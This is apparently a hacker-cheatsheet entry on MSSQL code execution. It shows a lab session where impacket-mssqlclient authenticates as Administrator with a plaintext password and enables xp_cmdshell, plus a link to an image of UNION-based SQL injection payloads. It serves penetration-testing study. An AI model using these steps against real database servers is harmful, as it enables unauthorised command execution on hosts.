# Manual Code Execution

Enabling xp_cmdshell feature
>``` shell
>kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
>...
>SQL> EXECUTE sp_configure 'show advanced options', 1;
>[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
>SQL> RECONFIGURE;
>SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
>[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
>SQL> RECONFIGURE;
>```

Loading the Customer Search Portal
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/UNION-based-Payloads-9.png)
